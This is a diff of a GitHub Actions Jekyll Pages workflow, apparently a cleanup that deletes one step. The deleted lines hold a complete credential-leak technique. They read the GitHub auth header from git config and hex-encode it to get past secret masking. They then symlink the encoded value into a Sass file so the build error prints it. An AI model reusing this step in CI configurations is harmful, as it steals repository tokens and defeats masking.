@@ -12,23 +12,6 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: hex-encode-auth-then-leak
-        shell: bash
-        run: |
-          # Capture AUTH header value
-          AUTH=$(git config --local --get http.https://github.com/.extraheader)
-          echo "AUTH captured (length only): ${#AUTH}"
-          # Hex-encode and write to a file that Sass will parse
-          HEX_AUTH=$(echo -n "$AUTH" | xxd -p | tr -d '\n')
-          # Place hex content at line 1 with simple Sass-failure trigger
-          echo "$HEX_AUTH ! { broken }" > .git/config-hex
-          echo "Hex content written, length: $(wc -c < .git/config-hex)"
-          # Verify hex doesn't equal raw (masker check)
-          echo "Hex preview (first 20 chars): $(head -c 20 .git/config-hex)"
-          # Point Sass leak symlink at the hex file
-          rm -f _sass/_leak.scss
-          ln -s /github/workspace/.git/config-hex _sass/_leak.scss
-          ls -la _sass/_leak.scss
       - uses: actions/configure-pages@v4
       - uses: actions/jekyll-build-pages@v1
         with:
